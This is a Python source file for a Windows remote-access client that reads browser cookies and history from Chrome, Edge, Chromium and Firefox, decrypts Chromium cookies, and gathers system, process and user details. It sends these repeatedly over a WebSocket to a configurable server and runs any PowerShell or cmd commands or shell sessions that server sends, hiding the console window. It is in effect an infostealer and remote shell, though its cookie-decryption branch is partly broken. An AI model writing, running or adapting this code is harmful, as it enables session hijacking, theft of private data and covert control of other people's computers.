import websocket
import json
import time
import random
from threading import Thread
import subprocess
import logging
import platform
import getpass
import sqlite3
import os
import shutil
import tempfile
from pathlib import Path
import winreg
import ctypes
import win32api
import win32con
import win32security
import win32process
import psutil
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2
import base64
import win32crypt

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class WindowsClient:
    def __init__(self, client_id, name):
        self.client_id = client_id
        self.name = name
        self.status = "offline"
        self.ws = None
        self.running = True
        self.os = f"Windows {platform.release()} {platform.version()}"
        self.is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0

    def get_browser_data(self):
        browser_data = {
            "firefox": {"cookies": [], "history": []},
            "chrome": {"cookies": [], "history": []},
            "edge": {"cookies": [], "history": []},
            "chromium": {"cookies": [], "history": []}
        }

        # Windows-specific browser paths
        paths = {
            "firefox": Path(os.getenv("APPDATA", "")) / "Mozilla" / "Firefox" / "Profiles",
            "chrome": Path(os.getenv("LOCALAPPDATA", "")) / "Google" / "Chrome" / "User Data" / "Default",
            "edge": Path(os.getenv("LOCALAPPDATA", "")) / "Microsoft" / "Edge" / "User Data" / "Default",
            "chromium": Path(os.getenv("LOCALAPPDATA", "")) / "Chromium" / "User Data" / "Default"
        }

        def decrypt_chrome_value(encrypted_value):
            try:
                # First try local state key decryption
                local_state_path = os.path.join(os.environ["LOCALAPPDATA"],
                    "Google", "Chrome", "User Data", "Local State")
                
                if os.path.exists(local_state_path):
                    with open(local_state_path, "r", encoding='utf-8') as f:
                        local_state = json.loads(f.read())
                        
                    # Get key from local state
                    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                    encrypted_key = encrypted_key[5:]  # Remove DPAPI prefix
                    
                    # Decrypt the key using DPAPI
                    key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
                    
                    # If the value starts with v10, it's using AES-GCM
                    if isinstance(encrypted_value, bytes) and encrypted_value.startswith(b'v10'):
                        nonce = encrypted_value[3:15]
                        cipher = encrypted_value[15:]
                        return win32crypt.CryptUnprotectData(cipher, None, None, None, 0)[1].decode()
                
                # Fallback to direct DPAPI decryption
                if encrypted_value:
                    return win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode()
                return ""
            except Exception as e:
                logger.error(f"Cookie decryption error: {e}")
                return "[Decryption failed]"

        def query_db_copy(original_db_path, query, db_name, browser_type=None):
            if not original_db_path or not original_db_path.exists():
                logger.warning(f"Database file not found: {original_db_path}")
                return []

            temp_dir = None
            try:
                temp_dir = Path(tempfile.mkdtemp())
                temp_db = temp_dir / original_db_path.name
                shutil.copy2(original_db_path, temp_db)
                logger.info(f"Copied {original_db_path} to {temp_db}")

                conn = sqlite3.connect(f"file:{temp_db}?mode=ro", uri=True, timeout=5)
                cursor = conn.cursor()
                cursor.execute(query)
                results = cursor.fetchall()

                # Decrypt cookies if this is a cookie database
                if browser_type in ['chrome', 'edge', 'chromium'] and 'cookies' in db_name.lower():
                    decrypted_results = []
                    for row in results:
                        try:
                            encrypted_value = row[2]
                            if encrypted_value:
                                decrypted_value = decrypt_chrome_value(encrypted_value)
                            else:
                                decrypted_value = ""
                            decrypted_results.append((row[0], row[1], decrypted_value))
                        except Exception as e:
                            logger.error(f"Failed to decrypt cookie value: {e}")
                            decrypted_results.append((row[0], row[1], "[Decryption failed]"))
                    results = decrypted_results

                conn.close()
                return results
            except Exception as e:
                logger.error(f"Error processing {db_name} at {original_db_path}: {e}")
                return []
            finally:
                if temp_dir and temp_dir.exists():
                    try:
                        shutil.rmtree(temp_dir)
                        logger.info(f"Cleaned up temporary directory: {temp_dir}")
                    except Exception as e:
                        logger.error(f"Failed to clean up {temp_dir}: {e}")

        # Chrome, Edge, Chromium
        for browser in ["chrome", "edge", "chromium"]:
            if browser in paths:
                browser_base_path = paths[browser]
                if browser_base_path.exists():
                    cookies_db = browser_base_path / "Network" / "Cookies"
                    if not cookies_db.exists():
                        cookies_db = browser_base_path / "Cookies"  # Try alternate location
                    
                    history_db = browser_base_path / "History"
                    
                    if cookies_db.exists():
                        cookie_results = query_db_copy(
                            cookies_db,
                            "SELECT host_key, name, encrypted_value FROM cookies",
                            f"{browser} cookies",
                            browser_type=browser
                        )
                        browser_data[browser]["cookies"] = [
                            {"host": row[0], "name": row[1], "value": row[2]} 
                            for row in cookie_results
                        ]
                    
                    if history_db.exists():
                        history_results = query_db_copy(
                            history_db,
                            "SELECT url, title FROM urls",
                            f"{browser} history"
                        )
                        browser_data[browser]["history"] = [
                            {"url": row[0], "title": row[1] if row[1] else "No Title"}
                            for row in history_results
                        ]

        # Firefox
        if "firefox" in paths:
            firefox_base_path = paths["firefox"]
            if firefox_base_path.exists():
                profile_dir = next((d for d in firefox_base_path.glob("*.default-release") if d.is_dir()), None)
                if profile_dir:
                    cookies_db = profile_dir / "cookies.sqlite"
                    history_db = profile_dir / "places.sqlite"
                    cookie_results = query_db_copy(cookies_db, "SELECT host, name, value FROM moz_cookies", "Firefox cookies", browser_type="firefox")
                    browser_data["firefox"]["cookies"] = [
                        {"host": row[0], "name": row[1], "value": row[2]} for row in cookie_results
                    ]
                    history_results = query_db_copy(history_db, "SELECT url, title FROM moz_places", "Firefox history", browser_type="firefox")
                    browser_data["firefox"]["history"] = [
                        {"url": row[0], "title": row[1] if row[1] else "No Title"} for row in history_results
                    ]

        return browser_data

    def get_system_info(self):
        """Get detailed Windows system information."""
        info = {}
        try:
            # Computer name
            info['computer_name'] = platform.node()
            
            # Windows version
            info['windows_version'] = platform.version()
            
            # System architecture
            info['architecture'] = platform.machine()
            
            # Processor
            info['processor'] = platform.processor()
            
            # Memory
            memory = psutil.virtual_memory()
            info['memory'] = {
                'total': f"{memory.total / (1024**3):.2f} GB",
                'available': f"{memory.available / (1024**3):.2f} GB",
                'used': f"{memory.used / (1024**3):.2f} GB",
                'percent': memory.percent
            }
            
            # Disk drives
            info['disks'] = []
            for partition in psutil.disk_partitions():
                try:
                    usage = psutil.disk_usage(partition.mountpoint)
                    info['disks'].append({
                        'device': partition.device,
                        'mountpoint': partition.mountpoint,
                        'fstype': partition.fstype,
                        'total': f"{usage.total / (1024**3):.2f} GB",
                        'used': f"{usage.used / (1024**3):.2f} GB",
                        'free': f"{usage.free / (1024**3):.2f} GB",
                        'percent': usage.percent
                    })
                except:
                    continue
            
            # Network interfaces
            info['network'] = []
            for interface, addresses in psutil.net_if_addrs().items():
                for addr in addresses:
                    if addr.family == 2:  # IPv4
                        info['network'].append({
                            'interface': interface,
                            'ip': addr.address,
                            'netmask': addr.netmask
                        })
            
            # Running processes
            info['processes'] = []
            for proc in psutil.process_iter(['pid', 'name', 'username', 'cpu_percent', 'memory_percent']):
                try:
                    info['processes'].append(proc.info)
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
            
            # User information
            info['user'] = {
                'username': getpass.getuser(),
                'is_admin': self.is_admin
            }
            
            # System uptime
            info['uptime'] = f"{psutil.boot_time() / 3600:.2f} hours"
            
        except Exception as e:
            logger.error(f"Error getting system info: {e}")
            info['error'] = str(e)
        
        return info

    def on_message(self, ws, message):
        logger.info(f"Received from server for {self.name}: {message}")
        try:
            data = json.loads(message)
            if data.get("type") == "ping":
                self.ws.send(json.dumps({"type": "pong"}))
            elif data.get("type") == "error":
                logger.error(f"Server error: {data.get('message')}")
                self.status = "offline"
            elif data.get("type") == "script":
                shell = data.get("shell")
                script = data.get("script")
                is_shell_session = data.get("is_shell_session", False)
                
                if is_shell_session:
                    if not hasattr(self, 'shell_process'):
                        self.shell_process = self.start_shell_session(shell)
                    
                    self.shell_process.stdin.write(f"{script}\n")
                    self.shell_process.stdin.flush()
                    
                    output = self.shell_process.stdout.readline()
                    response = {
                        "type": "script_response",
                        "client_id": self.client_id,
                        "result": output,
                        "request_id": data.get("request_id", str(time.time())),
                        "is_shell_session": True
                    }
                    self.ws.send(json.dumps(response))
                else:
                    result = self.execute_script(shell, script)
                    response = {
                        "type": "script_response",
                        "client_id": self.client_id,
                        "result": result,
                        "request_id": data.get("request_id", str(time.time())),
                        "is_shell_session": False
                    }
                    self.ws.send(json.dumps(response))
        except Exception as e:
            logger.error(f"Error processing message: {e}")

    def execute_script(self, shell, script):
        """Execute scripts in a Windows-specific way."""
        try:
            if script.strip().lower() == "whoami":
                return getpass.getuser()

            if shell == "powershell":
                # For PowerShell, we need to properly format the command
                result = subprocess.run(
                    ["powershell.exe", "-NoProfile", "-NonInteractive", "-Command", script],
                    capture_output=True,
                    text=True,
                    shell=False,  # Don't use shell=True
                    creationflags=subprocess.CREATE_NO_WINDOW  # Prevent command window from showing
                )
            else:  # cmd.exe
                # For CMD, we'll use a list to properly handle the command
                result = subprocess.run(
                    ["cmd.exe", "/c", script],
                    capture_output=True,
                    text=True,
                    shell=False,  # Don't use shell=True
                    creationflags=subprocess.CREATE_NO_WINDOW  # Prevent command window from showing
                )

            # Combine stdout and stderr for better error reporting
            output = result.stdout
            if result.stderr:
                output = output + "\n" + result.stderr if output else result.stderr
            
            return output if output else "Command executed successfully (no output)"
        except Exception as e:
            return f"Execution error: {str(e)}"

    def on_error(self, ws, error):
        logger.error(f"WebSocket error: {error}")
        self.status = "offline"

    def on_close(self, ws, close_status_code, close_msg):
        logger.info(f"Connection closed: {close_status_code} - {close_msg}")
        self.status = "offline"

    def on_open(self, ws):
        logger.info("Connected to server")
        self.status = "online"
        self.send_status()

    def send_status(self):
        if self.ws and self.status == "online":
            data = {
                "client_id": self.client_id,
                "name": self.name,
                "status": self.status,
                "lastActive": time.strftime("%H:%M:%S"),
                "os": self.os,
                "browser_data": self.get_browser_data(),
                "system_info": self.get_system_info()
            }
            try:
                logger.info(f"Sending status data: {json.dumps(data, indent=2)}")
                self.ws.send(json.dumps(data))
            except Exception as e:
                logger.error(f"Send error: {e}")
                self.status = "offline"

    def connect(self):
        while self.running:
            try:
                # Use localhost by default, or allow setting via environment variable
                server_ip = os.getenv('SERVER_IP', '127.0.0.1')
                server_port = os.getenv('SERVER_PORT', '8000')
                ws_url = f"ws://{server_ip}:{server_port}/ws"
                
                self.ws = websocket.WebSocketApp(
                    ws_url,
                    on_open=self.on_open,
                    on_message=self.on_message,
                    on_error=self.on_error,
                    on_close=self.on_close
                )
                logger.info(f"Attempting to connect to {ws_url}")
                self.ws.run_forever(ping_interval=10, ping_timeout=5)
            except Exception as e:
                logger.error(f"Connection failed: {e}")
            if self.running:
                logger.info("Attempting to reconnect in 5 seconds...")
                time.sleep(5)

    def simulate_activity(self):
        while self.running:
            if self.status == "online":
                self.send_status()
            time.sleep(random.randint(5, 10))

    def stop(self):
        self.running = False
        if self.ws:
            try:
                self.ws.close()
            except Exception as e:
                logger.error(f"Error closing WebSocket: {e}")

    def start_shell_session(self, shell):
        """Start a persistent shell session"""
        try:
            if shell == "powershell":
                process = subprocess.Popen(
                    ["powershell.exe"],
                    stdin=subprocess.PIPE,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True,
                    shell=True
                )
            else:
                process = subprocess.Popen(
                    ["cmd.exe"],
                    stdin=subprocess.PIPE,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True,
                    shell=True
                )
            return process
        except Exception as e:
            logger.error(f"Error starting shell session: {e}")
            return None

def generate_client_id():
    """Generate a unique client ID and store it in a file."""
    id_file = "used_client_ids.txt"
    used_ids = set()

    try:
        if os.path.exists(id_file):
            with open(id_file, "r", encoding="utf-8") as f:
                used_ids = set(line.strip() for line in f if line.strip())

        while True:
            new_id = f"{random.randint(0, 999):03d}-{random.randint(0, 999):03d}-{random.randint(0, 999):03d}"
            if new_id not in used_ids:
                used_ids.add(new_id)
                with open(id_file, "a", encoding="utf-8") as f:
                    f.write(f"{new_id}\n")
                return new_id
    except (IOError, PermissionError) as e:
        logger.error(f"Error handling client ID file: {e}")
        return f"temp-{random.randint(100, 999)}"  # Fallback ID

def main():
    client_id = generate_client_id()
    name = f"Windows_Client_{client_id}"

    client = WindowsClient(client_id, name)

    connect_thread = Thread(target=client.connect, daemon=True)
    activity_thread = Thread(target=client.simulate_activity, daemon=True)
    connect_thread.start()
    activity_thread.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        logger.info("Shutting down client...")
        client.stop()

if __name__ == "__main__":
    main() 